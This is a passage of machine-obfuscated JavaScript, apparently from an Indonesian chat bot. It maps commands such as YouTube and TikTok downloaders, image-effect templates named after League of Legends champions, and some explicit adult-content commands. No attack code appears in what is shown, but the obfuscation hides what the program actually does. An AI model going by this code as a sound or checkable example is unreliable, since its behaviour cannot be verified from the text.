_0x5364ad===_0x131031;},'ainpb':_0x240d04(0x1617),'tYQvW':function(_0x278487,_0x30ae29){return _0x278487(_0x30ae29);},'PjLUK':'kill2\x20','fKfsr':function(_0x2da9be,_0x36bbfc){return _0x2da9be+_0x36bbfc;},'YOoGj':_0x240d04(0xec1),'boxba':_0x240d04(0x25f2),'FvRlE':_0x240d04(0x1e6),'bkZeV':function(_0x208422,_0x9c3839){return _0x208422(_0x9c3839);},'jMvUO':function(_0x374d89,_0x1cd45c){return _0x374d89+_0x1cd45c;},'bRkMt':_0x240d04(0x2a24),'FGnDz':_0x240d04(0x1a1a),'DfcNq':function(_0x5cf6dc,_0x26c955){return _0x5cf6dc+_0x26c955;},'lijNg':_0x240d04(0x1740),'UWYxQ':_0x240d04(0x1ce6),'yxhEu':function(_0x5e47c2,_0x56bfef){return _0x5e47c2(_0x56bfef);},'DlbBv':_0x240d04(0x272e),'jEosS':function(_0x56df3c,_0x15c1de){return _0x56df3c+_0x15c1de;},'qSFjE':_0x240d04(0xed1),'hhznz':_0x240d04(0xb19),'GNBgD':function(_0x4e2706,_0x187ca6){return _0x4e2706+_0x187ca6;},'CKUgQ':_0x240d04(0x13c4),'wdwts':function(_0x740baf,_0x242268){return _0x740baf(_0x242268);},'KBwgH':'cringe2\x20','VkKda':'blowjob','MzwvF':function(_0x1ba7ce,_0x1ed97d){return _0x1ba7ce+_0x1ed97d;},'XZOdz':_0x240d04(0x133b),'haJQT':function(_0x102f1a,_0x3f7d90){return _0x102f1a+_0x3f7d90;},'UFxmZ':_0x240d04(0x2a8d),'BKwbt':function(_0x3630ec,_0x2f9446){return _0x3630ec(_0x2f9446);},'EgjtL':_0x240d04(0x27b3),'FiiGg':_0x240d04(0xbc0),'FllYa':_0x240d04(0x1cb6),'kohFs':function(_0x4bef6e,_0x9819a3){return _0x4bef6e(_0x9819a3);},'qmCSa':'trap2\x20','FnjvX':_0x240d04(0x1d8b),'RxglG':_0x240d04(0x9d9),'bWIpQ':_0x240d04(0x24f2),'eufZG':_0x240d04(0x1f1a)+'ni','yheQE':_0x240d04(0x1ed1),'MZiUk':_0x240d04(0xb67),'PzyAs':'santuy','zRsFi':'ukhty','OcBgk':_0x240d04(0x1e83),'HMaFR':_0x240d04(0x25f8),'xvPWe':_0x240d04(0x22af),'TFvgi':'bunga','jDXxA':_0x240d04(0x820),'sGFah':_0x240d04(0x2ee8),'tJHsL':'viona','SEIEq':_0x240d04(0x345),'HNymx':_0x240d04(0x2cb9),'CfSlt':_0x240d04(0x19a7),'SizHD':_0x240d04(0x183b),'sQnhW':_0x240d04(0x2c9a),'NQwPM':_0x240d04(0x1eb1),'xGOAk':function(_0x90d122,_0xa53353){return _0x90d122!==_0xa53353;},'rcqKn':_0x240d04(0x173e),'WtcHl':'alfa','COOGV':'/api/asupa'+'n/','EEoOe':'apikey','azbkn':function(_0x5f2e66,_0x1ed62d){return _0x5f2e66(_0x1ed62d);},'opHRv':_0x240d04(0x22b),'kIJTE':_0x240d04(0x2ebe),'Hpgxz':_0x240d04(0x2019),'nplBQ':function(_0x11053a,_0x219d7a){return _0x11053a+_0x219d7a;},'VNOJv':'wuyifan','CskGz':'suga','opowi':_0x240d04(0xb3c)+'ol','wAEOW':_0x240d04(0x15b4)+'g','bGZgb':'kimseok','npMUL':'kimminseok','AYvtS':_0x240d04(0xd0c)+'n','YKqff':_0x240d04(0x2689),'pBeQD':'jungkook','kKIcX':_0x240d04(0xabd),'VWuyJ':'dohkyungso'+'o','qJPeM':_0x240d04(0xbea),'GHrvX':_0x240d04(0x117d),'wgHkJ':_0x240d04(0x2e5b)+'/','kZjfB':function(_0x1b0171,_0x5361a5){return _0x1b0171(_0x5361a5);},'dgnty':_0x240d04(0x2495),'mUBXV':_0x240d04(0x1e60),'KBnBF':_0x240d04(0x949),'vGLoJ':_0x240d04(0xea0),'sPGXy':_0x240d04(0x2bd7),'yQzFo':_0x240d04(0x14ad),'wuljG':function(_0x469d59,_0x11cc59){return _0x469d59(_0x11cc59);},'AyCQG':function(_0x8ba5d8,_0x131d17){return _0x8ba5d8+_0x131d17;},'sEQKj':'youtube.co'+'m','bVLQk':_0x240d04(0x212)+'3','OrnWo':'ytshortmp3','VkXba':_0x240d04(0x15e9),'rpLkc':function(_0x8481d7,_0x482896){return _0x8481d7(_0x482896);},'lQbzh':function(_0x1376d8,_0x10556d){return _0x1376d8+_0x10556d;},'BJoez':_0x240d04(0x23b7),'iIRpT':function(_0xe3e151,_0x9aeb8b){return _0xe3e151(_0x9aeb8b);},'SgeUa':function(_0x4a5a0a,_0x33c12a){return _0x4a5a0a+_0x33c12a;},'eMZBb':function(_0x3cba9c,_0x457686){return _0x3cba9c+_0x457686;},'VggYe':function(_0x2a1767,_0x47a788){return _0x2a1767(_0x47a788);},'ueyTt':_0x240d04(0x70c),'JZLDB':function(_0x33a584,_0x281c32){return _0x33a584!==_0x281c32;},'MiKBZ':_0x240d04(0x2677),'OosvZ':_0x240d04(0x1366),'xeCJo':function(_0x2cca51,_0x5f04ce){return _0x2cca51(_0x5f04ce);},'bPNnf':function(_0x4965c4,_0x9e9d42){return _0x4965c4+_0x9e9d42;},'yyzvo':'snippet','AITnG':function(_0x33695d,_0x453429){return _0x33695d===_0x453429;},'chtWF':function(_0x44d63a,_0x141db2){return _0x44d63a===_0x141db2;},'RFHzp':_0x240d04(0x318),'dRAAt':_0x240d04(0x18d4),'pljTs':_0x240d04(0x19b)+_0x240d04(0x16b2)+'\x20ditemukan'+'.','SeciX':_0x240d04(0xec7),'xmlQJ':function(_0x404696,_0x1a9223){return _0x404696+_0x1a9223;},'nXMfr':_0x240d04(0x1ce7),'FSVuj':_0x240d04(0xea3),'kbsJi':_0x240d04(0xebe),'Wklbk':'pHllV','hTLBa':function(_0x54151b,_0x3aeefc){return _0x54151b+_0x3aeefc;},'rBlNL':_0x240d04(0x16d7),'wHrNA':_0x240d04(0x2e0e),'SXlYL':function(_0x2f1f49,_0x326859){return _0x2f1f49(_0x326859);},'vHSVP':function(_0xa68ad,_0x23b124){return _0xa68ad*_0x23b124;},'GMNpZ':'xnxx','aseFb':_0x240d04(0x7ac),'UPZaZ':_0x240d04(0x12a2),'AneAZ':function(_0x59efb7,_0xc19604){return _0x59efb7+_0xc19604;},'qBrNx':function(_0x34d585,_0xef7a21){return _0x34d585+_0xef7a21;},'Wkuoz':'KleHT','AYprl':function(_0x1fe54f,_0x221607){return _0x1fe54f(_0x221607);},'ayWtF':_0x240d04(0xf80)+_0x240d04(0x2166),'yLIdZ':function(_0xc8e2c3,_0x4d0fe9){return _0xc8e2c3(_0x4d0fe9);},'TtxmZ':function(_0x1a2467,_0x422a89){return _0x1a2467+_0x422a89;},'DWwzl':_0x240d04(0x2617),'pgOos':_0x240d04(0x15bd),'bhtCS':_0x240d04(0x148f),'GdZGJ':_0x240d04(0x19c6),'YXwOL':_0x240d04(0x28b4),'oWchB':function(_0x1f14f4,_0x2747a4){return _0x1f14f4+_0x2747a4;},'igAJU':_0x240d04(0xb29),'MOgxi':_0x240d04(0x2547),'vpVhl':_0x240d04(0xff3),'YkfFm':function(_0xda7bfd,_0x35bb45){return _0xda7bfd(_0x35bb45);},'yjCDW':function(_0x579c80,_0xd22f95){return _0x579c80(_0xd22f95);},'lQVDc':_0x240d04(0x2a90)+_0x240d04(0x1244),'hbsLO':function(_0x238920,_0x5b6a93){return _0x238920(_0x5b6a93);},'SJMbw':function(_0x537462,_0x1bbe2e){return _0x537462(_0x1bbe2e);},'nxRJg':_0x240d04(0x6ec),'nsVPJ':function(_0x1ca8fe,_0x39b410){return _0x1ca8fe(_0x39b410);},'OPeny':_0x240d04(0x939),'OMLLD':function(_0x3cb923,_0x3c4626){return _0x3cb923(_0x3c4626);},'WtimS':function(_0x139093,_0x46dc02){return _0x139093+_0x46dc02;},'IyOQu':function(_0x174c15,_0x224f72){return _0x174c15(_0x224f72);},'Qgxji':_0x240d04(0x410),'PZHOJ':'Tiktok\x20Aud'+_0x240d04(0x4c4),'OjyDG':_0x240d04(0x373)+'o','LiIum':function(_0x4908c7,_0xe3153b){return _0x4908c7(_0xe3153b);},'lZJxt':function(_0x40cd6b,_0xeb4e7d){return _0x40cd6b+_0xeb4e7d;},'aJBZu':function(_0x41fe4d,_0x59d722){return _0x41fe4d+_0x59d722;},'jTvyY':function(_0x49af45,_0x4f241c){return _0x49af45+_0x4f241c;},'sIArT':'coverbanne'+_0x240d04(0x2e78),'XtBfn':'MDLaq','jizRF':function(_0x359868,_0x492d09){return _0x359868(_0x492d09);},'QTePM':function(_0x3fad65,_0x165259){return _0x3fad65+_0x165259;},'bfOCy':_0x240d04(0x7bc),'AKMsR':_0x240d04(0x2444),'gCfyH':'nissfortun'+_0x240d04(0x1bd7),'pfWIt':'pyke-7','HmDma':_0x240d04(0x25ed),'qZbiM':_0x240d04(0x14c6),'MfsDw':_0x240d04(0x1555)+_0x240d04(0x1dc8),'LdknO':_0x240d04(0x1810),'wGzcT':_0x240d04(0x209d),'zSbTb':_0x240d04(0x2283),'mShOY':'soraka-9','gJEgZ':_0x240d04(0x2db6),'ijwLU':'xayah-3','tMHFr':_0x240d04(0x1183),'oOrPh':_0x240d04(0x1e7),'bGlqQ':_0x240d04(0x18a4),'UtZuH':_0x240d04(0x578),'FizrA':_0x240d04(0x3d3),'vWnuu':_0x240d04(0x2502),'iybJp':_0x240d04(0x8f1),'GFgGL':_0x240d04(0x708),'mQASu':'draven-3','nYZfz':_0x240d04(0xa89),'OPWYa':_0x240d04(0x1312),'dnRTX':'ezreal-7','GUtng':_0x240d04(0x1807),'HxqZq':_0x240d04(0x1aa7),'qCCXB':_0x240d04(0x2672),'BtoWB':'leblanc-7','LYziy':'leona-7','hvQou':_0x240d04(0x1186)+'4','GapvR':_0x240d04(0xe04),'JhBCO':'nasteryi-7','PZusq':_0x240d04(0x2338),'XzHKJ':_0x240d04(0x195e),'mSVzp':_0x240d04(0x2390),'KkYLB':_0x240d04(0x290d),'LMRFb':_0x240d04(0x2e4d),'Zmxdg':_0x240d04(0x28fc),'nFNdg':'caitlyn-7','HEUPP':_0x240d04(0x28a3),'aHEYj':_0x240d04(0x16cf),'cgyda':_0x240d04(0x1243),'MgaLR':_0x240d04(0x1f27),'YJvwG':_0x240d04(0x2cd2),'jMlix':_0x240d04(0x2434),'KZjHA':_0x240d04(0x18df),'tphQL':_0x240d04(0x4f6),'qREUV':_0x240d04(0x14bc),'SuCry':_0x240d04(0x910),'zMnWa':_0x240d04(0x406),'mcpnh':_0x240d04(0x1299),'BxRcp':_0x240d04(0x2737),'QJHoH':_0x240d04(0x2174),'lkpxg':_0x240d04(0x28e0),'heqdM':_0x240d04(0x1003)+'-3','MhVsW':_0x240d04(0x4f7),'yxtjL':_0x240d04(0x855),'DoHnq':_0x240d04(0x27eb),'yriqA':_0x240d04(0xa16),'LOBMU':_0x240d04(0x1520),'DXifB':'anivia-4','Qerbg':_0x240d04(0x138e),'ctCYL':_0x240d04(0x15ea)+_0x240d04(0x2c42),'QBCtf':_0x240d04(0x2935),'HaWsn':_0x240d04(0x1b2),'bNZDq':_0x240d04(0x1581),'HDecH':'ashe-6','RXmmv':_0x240d04(0x23a1)+'-4','Oyeew':_0x240d04(0x2381),'bGQQu':_0x240d04(0x228c),'EJOTi':_0x240d04(0x3e3),'QQRGB':_0x240d04(0x22ec),'KNWET':'relia-11','IdHlI':_0x240d04(0x1fa4),'qsjBp':_0x240d04(0x11c2),'TbAIR':_0x240d04(0x1739),'xWRpk':_0x240d04(0x27d9),'DGfHw':_0x240d04(0x146),'Bljbp':'veigar-4','LXerm':'camille-4','fNRAt':_0x240d04(0x1fd4),'chpRK':_0x240d04(0x3e0),'bHFGI':'nordekaise'+_0x240d04(0x217d),'CaaSO':_0x240d04(0x23ed),'mZsHc':_0x240d04(0x196d),'wqZQO':_0x240d04(0xb57),'qIKpq':_0x240d04(0x105),'thesQ':_0x240d04(0x829),'TsDTH':_0x240d04(0x1660),'jeJCx':_0x240d04(0x2c85),'cYqcJ':_0x240d04(0x2379),'dWcKV':_0x240d04(0x710),'nSHwf':'blitzcrank'+'-3','yPmum':_0x240d04(0x1a39),'fKQlz':_0x240d04(0x1d42),'yabkg':_0x240d04(0x1b8b),'OpeYA':_0x240d04(0x2203),'iZjIw':_0x240d04(0x23bd),'HFUiv':_0x240d04(0x2a1),'fSLST':_0x240d04(0x880),'vdvlY':'blitzcrank'+'-2','rAJQM':'kogmaw-4','yBrfk':_0x240d04(0xdc),'zwgGz':'alzahar-3','Rjiyd':'syndra-4','nRBBf':_0x240d04(0x1ab6),'NLGQA':_0x240d04(0x1eff),'GViQz':'alistar-4','RPYym':'chogath-2','OjAMc':_0x240d04(0x4e9),'vfMhy':_0x240d04(0x19cb),'jAqCF':_0x240d04(0x8bc),'dEKhH':'jhin-5','DaGXC':_0x240d04(0x1f00),'FJyPc':_0x240d04(0xbc3),'MOfNN':_0x240d04(0x3f0),'pIQJU':_0x240d04(0x731),'PNjgj':_0x240d04(0x2139),'dUADl':_0x240d04(0x299f),'usLsH':_0x240d04(0x37a),'OrvgB':_0x240d04(0x2056),'iNFDq':_0x240d04(0x18b),'cjLAC':_0x240d04(0x1058),'DWPgU':_0x240d04(0x19eb),'UcNGG':_0x240d04(0x1b43),'Yzova':_0x240d04(0x2ddb),'woOId':_0x240d04(0xae5),'jdCkC':'nasus-4','vLFwp':_0x240d04(0x2585)+'4','wfwgr':_0x240d04(0x1cd6),'ZnjQy':_0x240d04(0x222a),'NkrqW':_0x240d04(0x120b),'xleTV':_0x240d04(0x1d4e),'yfJpZ':'vladimir-4','ExguU':'yorick-4','qUHEc':_0x240d04(0x3c3),'dTBcJ':_0x240d04(0x293f),'ekdMk':_0x240d04(0x29b1),'YNtoN':_0x240d04(0x2d36),'Ifyjq':_0x240d04(0x2585)+'2','SxBEs':_0x240d04(0x4b9),'vEmNS':'amumu-3','lNjFe':_0x240d04(0x286f),'kEbdH':_0x240d04(0xbb7),'UEYFP':_0x240d04(0xef),'ZssKj':_0x240d04(0x1399),'SITmU':_0x240d04(0x15ea)+'e-3','SgMqH':'ashe-5','GGVyh':_0x240d04(0x945),'vnZqv':'leesin-5','lGPie':_0x240d04(0x720),'oLwHD':_0x240d04(0x5f6),'kAvku':_0x240d04(0x2300),'voAWI':_0x240d04(0x204c),'XAHjA':_0x240d04(0x498),'Caufi':_0x240d04(0x387),'NYYKQ':_0x240d04(0xc7),'KfBZN':_0x240d04(0x197),'UWnzp':_0x240d04(0x21c4),'HlyBD':_0x240d04(0x1230),'aCoXo':'sona-4','nCgIR':'vi-4','zCeXz':_0x240d04(0x126c),'SfigN':_0x240d04(0x201),'hkxDp':_0x240d04(0x2483),'DEyKC':'cassiopeia'+'-3','tdLep':_0x240d04(0x1c1),'rGhxW':'kennen-2','ixpzH':'lillia','eBpON':_0x240d04(0xeb6),'LDgji':_0x240d04(0xc95),'VvatQ':_0x240d04(0x27d1),'UHLDm':_0x240d04(0xeb3),'ewLTu':'yasuo-6','eJqVV':_0x240d04(0x1e2c),'HHmkf':_0x240d04(0xf04),'ZAGwi':'gnar-3','wIuvU':_0x240d04(0x40c),'FQGcs':_0x240d04(0x3a3),'bTfQL':'poppy-3','AlGvd':_0x240d04(0x263d),'fcYmH':_0x240d04(0x107f),'eKjIJ':'ekko-5','WsLMR':'lucian-4','XWPPH':_0x240d04(0x381),'yvzit':_0x240d04(0x1991),'XfYrw':'zyra-3','eBrkq':_0x240d04(0x4bc),'GsdnA':_0x240d04(0x2abf),'eOZzr':_0x240d04(0x136b),'cFYdC':_0x240d04(0xf2),'ELmLH':'nasteryi-5','JURcC':_0x240d04(0x2688),'twCVw':_0x240d04(0x2c27)+_0x240d04(0x2ddc),'CHsSC':'sejuani-4','FHcnV':'tryndamere'+'-2','NcPPI':_0x240d04(0x2e40),'jfCjC':_0x240d04(0x297f),'keFiC':_0x240d04(0x20f8),'wJVFu':'leesin-4','DJgEL':_0x240d04(0x2c5a),'FWKmS':_0x240d04(0x1b4d),'heCRx':_0x240d04(0x1a33),'kNGaH':'sylas-3','PNpEP':'trundle-2','kMlza':'vladimir-3','jkPZH':_0x240d04(0x16f2),'hUkrU':_0x240d04(0x7f2),'VMLEb':_0x240d04(0x274e),'yUMhq':'yasuo-5','nWxFF':'ashe-4','ljqMk':_0x240d04(0x2b91),'mRoYu':_0x240d04(0x16c6),'sKzHg':_0x240d04(0x1bea),'kXSLz':_0x240d04(0x1728),'CfnVJ':_0x240d04(0x1e1),'sNcQa':_0x240d04(0x1779),'nrPVr':_0x240d04(0xaa8),'CCynJ':_0x240d04(0x1db5),'AHNRp':_0x240d04(0x703),'VATjL':_0x240d04(0x24b7),'mCJAC':_0x240d04(0x10d6),'uFapI':_0x240d04(0x1765),'Agsfo':_0x240d04(0xda),'phIng':_0x240d04(0x79a),'rukQV':_0x240d04(0x25fc),'aeIzo':_0x240d04(0x1a6c),'Dwjun':_0x240d04(0x1bab),'Ztzhx':_0x240d04(0x583),'sDcrA':_0x240d04(0xc0),'EtmVT':_0x240d04(0x1256),'exAnc':_0x240d04(0x20a4),'ybxKp':'qiyana','IuvuY':_0x240d04(0x1eb9),'IWBJR':_0x240d04(0x18f3),'RPMyo':_0x240d04(0x1698),'IZgKd':'tristana-4','FcZQM':_0x240d04(0x21a1),'IEDIj':_0x240d04(0x24ce),'eaPYJ':'lulu','JPome':'braum','mXNZO':_0x240d04(0x293d),'uOlJy':'karma','Njkdp':'kindred','kUdNY':_0x240d04(0x7de),'CXCSk':_0x240d04(0x2bfb),'XibAt':_0x240d04(0x91a),'DrPYk':_0x240d04(0x1744),'DCYkw':'varus','ZQGdU':_0x240d04(0x1984),'iOvZU':'blitzcrank','iDppx':_0x240d04(0x1951)+_0x240d04(0x23e3),'GxcLn':_0x240d04(0x1c29)+_0x240d04(0x610),'CMRMg':_0x240d04(0x1456),'ZBZJS':_0x240d04(0x20c0),'yrIIO':_0x240d04(0x2589),'ZCwLt':_0x240d04(0x7e0),'iipnV':_0x240d04(0x1003),'FhmOq':'viktor','xVQlx':_0x240d04(0x793),'kbJkr':_0x240d04(0xaa5),'Mtdus':_0x240d04(0x357),'ohCVH':_0x240d04(0x9a4),'lkOKr':_0x240d04(0x968),'zeScr':_0x240d04(0x2ab0),'fSVcT':_0x240d04(0x807),'AXDbk':'ryze','gLkkZ':_0x240d04(0x382),'fKwFJ':_0x240d04(0x26b2),'afQOo':_0x240d04(0x118d)+'e','TKhxB':_0x240d04(0x2793),'jzDYA':'zyra','ERDhH':'quinn','XzzLz':_0x240d04(0x2de5)+'e','hkoZJ':_0x240d04(0x172f)+'hen','VQSNv':_0x240d04(0x1346)+'ie','dDVCp':'xinzhao','sIdBt':_0x240d04(0x11ca),'ddECS':_0x240d04(0xc04),'CxosQ':'reksai','LSQAQ':_0x240d04(0xcee),'ctfAs':_0x240d04(0x262e),'rcrbH':_0x240d04(0x5f4),'TMDGs':_0x240d04(0xf66),'KcbuR':'warwick','BaiCS':_0x240d04(0xd31),'aSWnJ':'caitlyn','qKJvH':_0x240d04(0xbbb),'Xcnin':'talon','NlsGD':'nidalee','lqGDx':_0x240d04(0x408),'ZqXfY':_0x240d04(0x1f87),'erYSt':_0x240d04(0x205d),'NknLV':_0x240d04(0x1384),'Invhd':_0x240d04(0x28f8),'PMVrh':_0x240d04(0x2842),'pWXPj':_0x240d04(0xc1b),'tgeuo':_0x240d04(0xac8),'YlkzQ':_0x240d04(0x29f6),'UsnTe':'leblanc','FthWX':_0x240d04(0x695),'IvtJH':_0x240d04(0xa4c),'nIzQD':_0x240d04(0x29d9),'XZjBX':_0x240d04(0x674),'Fvuoe':_0x240d04(0x299c),'XzGUo':_0x240d04(0x1b12),'JgUIS':_0x240d04(0x295),'ZNXHv':'khazix','FpuMD':_0x240d04(0x291c),'blgjd':_0x240d04(0x23a1),'OWxkX':_0x240d04(0x16fc),'zdkHn':'rakan','BghNx':'syndra','BcCqg':_0x240d04(0x649),'mDVAj':_0x240d04(0x2159),'CeoDl':_0x240d04(0x1900),'YXfEC':_0x240d04(0xc32)+'l','RaxXP':_0x240d04(0x1ebc),'HyPrZ':_0x240d04(0x15d),'oByyJ':_0x240d04(0x11a5),'ThuTX':_0x240d04(0x2d04),'fbHLf':'xerath','ubXvG':_0x240d04(0x882),'dXkle':_0x240d04(0x4d3),'yOGvZ':_0x240d04(0x119),'THUIh':_0x240d04(0x1647),'jrBPM':_0x240d04(0x198),'otuDQ':_0x240d04(0x1bda),'xKWqY':_0x240d04(0x2591),'OCNhj':'talon2','VdXhc':'kayle','IZuga':_0x240d04(0x2471),'VYSsn':'vladimir','GZXQO':'ahri-2','cOGlV':_0x240d04(0x10f0),'DHonS':_0x240d04(0x2037),'vPhpn':_0x240d04(0x337),'rGPCk':'vayner-2','LXoNV':'rengar-2','QjbzB':_0x240d04(0x4a5),'dXhea':_0x240d04(0x13b5),'FxTrU':_0x240d04(0x193),'vDdAG':'nalzahar','jTGbX':'olaf','iAZSy':'swain','RQEvl':_0x240d04(0x1a2a),'JCXna':_0x240d04(0x2d4b),'GFUeZ':_0x240d04(0xed3),'idqAj':'fiddlestic'+'ks','qkOmI':_0x240d04(0x1252),'tklMN':_0x240d04(0x131b),'xfEXM':_0x240d04(0x213a),'vHyWi':'velkoz-2','jEhEo':_0x240d04(0x24a6),'BUSKP':_0x240d04(0x13fd),'ZEHve':_0x240d04(0x149d),'mhTkW':'yasuonb','JvgDr':_0x240d04(0x271),'SqtsU':'kaisa','RuMEG':'veigar-2','OwYco':_0x240d04(0xf63),'oQGVp':_0x240d04(0x14b),'jeCqL':_0x240d04(0x1049),'oMezj':'nalzahar-2','bgpsr':_0x240d04(0x975),'xjTqc':_0x240d04(0x8e8),'XsqEA':_0x240d04(0x2491),'MFlYA':_0x240d04(0x89b),'GcqGJ':'soraka-2','zWLCL':'nissfortun'+_0x240d04(0x1a03),'lJUqT':_0x240d04(0x189b),'RgbZK':'ahri-3','vTatA':_0x240d04(0xf42),'EHyBT':_0x240d04(0x152c),'oxkwS':_0x240d04(0x1bc3),'VuGKa':_0x240d04(0x20e4),'OBZtn':_0x240d04(0x23a1)+'-2','SxGrv':_0x240d04(0x1e01),'iYRvF':_0x240d04(0x231e),'bOrww':'alistar-2','koZFV':_0x240d04(0x25e3),'PHdqs':_0x240d04(0x31e),'tRmIU':'yorick-2','hoxno':_0x240d04(0x7f5),'rqePw':_0x240d04(0x2c27)+'r','hftcD':'nasteryi-3','dZtrh':_0x240d04(0x47f),'VJdXB':'janna-2','yFFqZ':_0x240d04(0x1b34),'bERLv':_0x240d04(0x18cc),'daxmS':_0x240d04(0x14e4),'WtmAt':_0x240d04(0x1370),'xFvAV':_0x240d04(0x12de),'iWFaL':_0x240d04(0x2a43),'OEDAp':_0x240d04(0xf55),'jyKVj':_0x240d04(0x2de5)+_0x240d04(0x1a1),'JKMML':_0x240d04(0x2da0),'erXZr':_0x240d04(0x255c),'EpNAT':_0x240d04(0xacc),'cDHLI':'sivir-2','xtPIR':_0x240d04(0x2de5)+_0x240d04(0x2c42),'phBnM':_0x240d04(0x10b4),'uaUBR':_0x240d04(0x15ea)+'e-2','aOExC':_0x240d04(0x79b),'TTsfR':_0x240d04(0x1f5d),'kKTNx':'pyke-2','FKDLL':_0x240d04(0x43a),'uCsVH':_0x240d04(0x1165),'krFYZ':_0x240d04(0xb3a),'rbOjY':_0x240d04(0x1aae),'XiUOA':_0x240d04(0xd4e),'ZMAdc':_0x240d04(0x144),'FfIhx':_0x240d04(0x276c),'AqPnt':_0x240d04(0xae9),'FeUvG':_0x240d04(0x1e4e),'yipwj':_0x240d04(0x1d04),'asGWF':'shyvana-2','KJxKo':_0x240d04(0x1198),'JgYwt':'jax-3','ysiIx':'darius-3','LiRPg':_0x240d04(0x2886),'wuPfk':_0x240d04(0x2b5a),'Ohtzj':_0x240d04(0x2b23),'Moqiu':_0x240d04(0x2b5f),'jnrhq':'akali-3','XvPWN':_0x240d04(0x28ad),'CuXHb':_0x240d04(0xe69),'yoLnt':_0x240d04(0x141a),'bcExq':'tristana-3','BeXom':'talon-3','ORkGk':'sejuani-2','VTKNW':_0x240d04(0x1c85),'iKqIh':'lulu-2','shaHn':_0x240d04(0x1085),'VvpjF':_0x240d04(0x13bc),'zthEb':'ashe-3','maDpS':_0x240d04(0x2d57),'kqwiX':_0x240d04(0x18f8),'WIGVo':_0x240d04(0x2cc2),'cmsCP':_0x240d04(0x2eee),'vlFtb':_0x240d04(0x2d26),'IJhPb':_0x240d04(0x1555)+_0x240d04(0x2312),'EyxGO':_0x240d04(0x2a9),'AlmGt':'evelynn-3','aUTXr':'akali-5','LmUCq':_0x240d04(0x1d33),'yQjTk':'thresh-3','aVvmK':_0x240d04(0x1e63),'PudtE':'kled-2','PTTIn':'janna-4','aZfml':_0x240d04(0x189e),'JLnDZ':_0x240d04(0x83c)+_0x240d04(0x2c0f),'OCPcG':'nami-2','ODDtW':_0x240d04(0x1187),'vSiCN':_0x240d04(0x1186)+'2','wvwpN':_0x240d04(0x2907),'MIRro':_0x240d04(0x10be),'tGWtS':_0x240d04(0x2a1d),'qiBfH':_0x240d04(0x2a51),'psIkb':'renekton-3','eVKKD':_0x240d04(0x105b),'ujGFL':_0x240d04(0x1b79),'szcEF':_0x240d04(0x2ec1),'sIXeB':_0x240d04(0xf62),'tLlUk':_0x240d04(0x1a90),'JmsBF':_0x240d04(0xee6),'ITSkQ':_0x240d04(0x1031),'oqVwg':_0x240d04(0x297a),'qxlnZ':_0x240d04(0x124f),'Hiihk':_0x240d04(0xced),'penli':_0x240d04(0x14d6),'dnvNG':_0x240d04(0x16a5),'gRXPs':_0x240d04(0xd3e),'uKqOf':_0x240d04(0x559),'gWeDE':'nidalee-3','vARKh':'norgana-2','cbHlj':_0x240d04(0x2e5d),'ucBpi':_0x240d04(0x2a42),'AwBGI':_0x240d04(0x54d),'gnrEg':'karthus-2','yknLH':_0x240d04(0x2d0a),'BmjNR':_0x240d04(0x2336),'XXhuf':_0x240d04(0xb00),'BamBI':_0x240d04(0x283),'pLDuO':_0x240d04(0x21e1),'XjKPG':_0x240d04(0x5df),'mttNj':_0x240d04(0x5be),'UiJAB':_0x240d04(0xe31),'oLqFV':_0x240d04(0x4de)+'2','uPGXX':_0x240d04(0x449),'vifvj':_0x240d04(0x1f48),'ZmhCu':_0x240d04(0x1af4),'tQrcP':_0x240d04(0x2ed7),'OInwH':_0x240d04(0xfce),'Ykaew':_0x240d04(0xdd1),'BhlYN':_0x240d04(0x148),'pAdIE':_0x240d04(0x69f),'ZlNwM':_0x240d04(0x242d),'JwvCd':_0x240d04(0x2cb8),'Cjlkk':'zed-4','AWzzC':_0x240d04(0x2bbf),'HbJCK':_0x240d04(0x2a40),'RQEfL':_0x240d04(0x1613),'XxDEI':'fiora-5','LgZSV':'yuumi-2','FFPXT':_0x240d04(0x1e75),'KRxBo':_0x240d04(0x18af),'WGytz':_0x240d04(0x9cf),'PNqSq':_0x240d04(0x797),'PSiHY':'graves-4','Pmhyi':_0x240d04(0x2a11),'aDAEy':function(_0x32d342,_0x165850,_0x38c13c,_0x5de860){return _0x32d342(_0x165850,_0x38c13c,_0x5de860);},'vFzui':function(_0x3fd36a,_0x52c848){return _0x3fd36a(_0x52c848);},'jkJNj':function(_0x17d858,_0x66141e,_0x501371,_0x178564,_0x274b45){return _0x17d858(_0x66141e,_0x501371,_0x178564,_0x274b45);},'Bviqc':function(_0x2773e1,_0x19839f){return _0x2773e1+_0x19839f;},'jrCNG':'/api/ephot'+_0x240d04(0x1d21),'HoSLh':'pubglogoma'+_0x240d04(0x1322),'eeFml':function(_0x173f05,_0x4526ce){return _0x173f05===_0x4526ce;},'zhabs':_0x240d04(0x16fd),'ZwmPA':_0x240d04(0x1766),'nKfYn':function(_0x20e2ba,_0x40822e){return _0x20e2ba(_0x40822e);},'byMyg':_0x240d04(0x278f),'mIvHK':_0x240d04(0xf21),'BzIWh':function(_0x44a9ab,_0x4be141,_0x2db564,_0x7133c8){return _0x44a9ab(_0x4be141,_0x2db564,_0x7133c8);},'ctRXw':function(_0x1512b2,_0x310e2a){return _0x1512b2+_0x310e2a;},'EgJqV':_0x240d04(0x20a9)+'bg','oDDSy':function(_0x20aea6,_0x222a63){return _0x20aea6!==_0x222a63;},'QRoJI':'sgbne','vwqgE':'MdABJ','cPMyz':function(_0x377758,_0x4fde10){return _0x377758+_0x4fde10;},'kLOmN':function(_0x6acf1d,_0x2c7f84){return _0x6acf1d+_0x2c7f84;},'NTxdE':_0x240d04(0x258c),'CXmAS':_0x240d04(0x2da8),'VWhyA':_0x240d04(0x12ae)+'w','WAVWF':_0x240d04(0x2ce5)+'ow','OZFOW':_0x240d04(0x2901),'yHYEA':_0x240d04(0x80f),'ABqYG':_0x240d04(0x1953),'CiAlu':function(_0x586fca,_0x4e6d43){return _0x586fca(_0x4e6d43);},'utHJi':function(_0x38ab97,_0x23bd38){return _0x38ab97(_0x23bd38);},'xvETY':function(_0x5d9810,_0x1bf1e5){return _0x5d9810+_0x1bf1e5;},'xZOgh':function(_0x4b2a29,_0x23715b){return _0x4b2a29(_0x23715b);},'FSnCJ':function(_0x4f61cc,_0x2f229d){return 